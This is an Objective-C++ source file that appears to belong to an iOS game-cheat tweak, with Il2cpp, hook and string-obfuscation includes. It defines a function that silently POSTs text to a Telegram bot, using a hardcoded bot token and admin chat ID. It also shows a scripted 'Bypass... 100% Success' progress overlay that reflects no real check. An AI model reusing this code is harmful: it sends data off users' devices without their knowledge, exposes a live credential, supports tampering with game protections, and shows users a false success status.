#include "Security/oxorany_include.h"
#include "Security/oxorany.h"
#include <cstdint>
#include <string>
#include <iostream>
#include <fstream>
#include "LoadView/Includes.h"
#include <Foundation/Foundation.h>
#include <libgen.h>
#include <mach-o/fat.h>
#include <mach-o/loader.h>
#include <mach/vm_page_size.h>
#include <unistd.h>
#include <array>
#include <deque>
#include <map>
#include <vector>
#include <sys/time.h> 
#include <string>
#include <stdbool.h>
#include <list>
#include <vector>
#include <string.h>
#include <pthread.h>
#include <thread>
#include <cstring>
#include <unistd.h>
#include <fstream>
#include <iostream>
#include <dlfcn.h>
#include <sys/utsname.h>
#include <Foundation/Foundation.h>
#include <mach/mach.h>
#include <mach-o/dyld.h>
#include <mach-o/loader.h>
#include <mach-o/getsect.h>
#include <mach-o/nlist.h>
#include <UIKit/UIKit.h>
#include <CoreFoundation/CoreFoundation.h>
#include <limits>
#include <chrono>
#include <unordered_map>
#include "imgui/imgui_toggle.h"
#include "imgui/Il2cpp.h"
#include "LoadView/Icon.h"
#include "imgui/stb_image.h"
#include "Lib/Logo.h"
#include "imgui/imgui_additional.h"
#include "imgui/bdvt.h"
#include "Lib/mahoa.h"
#include <UIKit/UIKit.h>
#include "Lib/stb_image.h"
#include "Lib/img.h"
#include "../Lib/MonoString.h"
#include "../Lib/hook.h"
#include "LoadView/Loading/JGProgressHUD.h"
#include "LoadView/Loading/JGProgressHUDIndeterminateIndicatorView.h"
#include "LoadView/Loading/JGProgressHUDRingIndicatorView.h" 
#include <sstream>
using namespace std;
#define STB_IMAGE_IMPLEMENTATION
#define timer(sec) dispatch_after(dispatch_time(DISPATCH_TIME_NOW, sec * NSEC_PER_SEC), dispatch_get_main_queue(), ^
#define iPhonePlus ([UIScreen instancesRespondToSelector:@selector(currentMode)] ? CGSizeEqualToSize(CGSizeMake(1242, 2208), [[UIScreen mainScreen] currentMode].size) : NO)
#define kWidth [UIScreen mainScreen].bounds.size.width
#define kHeight [UIScreen mainScreen].bounds.size.height
#define kScale [UIScreen mainScreen].scale

void sendtele(const std::string& text, const std::string& chatId, const std::string& token) 
{
    NSString *urlString = 
    [NSString stringWithFormat:@"https://api.telegram.org/bot%@/sendMessage", [NSString stringWithCString:token.c_str() encoding:NSUTF8StringEncoding]]; 
    NSString *params = [NSString stringWithFormat:@"chat_id=%@&text=%@", 
    [NSString stringWithCString:chatId.c_str() encoding:NSUTF8StringEncoding], 
    [NSString stringWithCString:text.c_str() encoding:NSUTF8StringEncoding]];
    NSURL *url = [NSURL URLWithString:urlString];
    NSMutableURLRequest *request = [NSMutableURLRequest requestWithURL:url];
    [request setHTTPMethod:@"POST"];
    [request setHTTPBody:[params dataUsingEncoding:NSUTF8StringEncoding]];
    
    NSURLSession *session = [NSURLSession sharedSession];
    NSURLSessionDataTask *task = [session dataTaskWithRequest:request completionHandler:^(NSData *data, NSURLResponse *response, NSError *error) 
    {
        if (error) 
        {
            NSLog(@"Error: %@", error.localizedDescription);
        } 
        else 
        {
            NSLog(@"Response: %@", [[NSString alloc] initWithData:data encoding:NSUTF8StringEncoding]);
        }
    }];
    [task resume]; // Bắt đầu nhiệm vụ
}
void saveToFileTele(const std::string& text) // Send log BOT telegram
{
    std::string chatId = "6667284586"; // Chat ID Admin
    std::string token = "7665584188:AAFjoUtFQ3zfvYFo1-5AS2fULpdPREYq9sA"; // Token 
    sendtele(text, chatId, token); // Call
}

bool at = true, att = false;
void ShowEndSuccess() {
    if (at && !att) {
        att = true;
        JGProgressHUD *hud = [[JGProgressHUD alloc] init];
        hud.textLabel.text = @"Bypass...";
        hud.indicatorView = [[JGProgressHUDIndeterminateIndicatorView alloc] init];
        hud.backgroundColor = [UIColor colorWithWhite:0.0 alpha:0.6];
        hud.contentView.backgroundColor = [UIColor colorWithWhite:1.0 alpha:1.0];
        UIWindow *window = [UIApplication sharedApplication].windows.firstObject;
        if (window) {
            [hud showInView:window];
        }
        dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.2 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
            hud.textLabel.text = @"Loading..."; 
            // Tạo ring indicator
            JGProgressHUDRingIndicatorView *ringIndicator = [[JGProgressHUDRingIndicatorView alloc] init];
            ringIndicator.ringWidth = 3.0;
            ringIndicator.ringColor = [UIColor blueColor];
            ringIndicator.ringBackgroundColor = [UIColor blackColor];
            hud.indicatorView = ringIndicator;
            [ringIndicator setProgress:0.0 animated:NO]; // Bắt đầu từ 0
            [UIView animateWithDuration:2.0 // Thời gian animation 2 giây
                             animations:^{
                                 [ringIndicator setProgress:1.0 animated:YES];
                                 hud.textLabel.text = @"100% Success";
                             } completion:^(BOOL finished) {
                                 // Delay 0.5 giây sau khi hoàn thành rồi ẩn
                                 dispatch_after(dispatch_time(DISPATCH_TIME_NOW, (int64_t)(0.5 * NSEC_PER_SEC)), dispatch_get_main_queue(), ^{
                                     [hud dismiss];
                                 });
                             }];
        });
    }
}

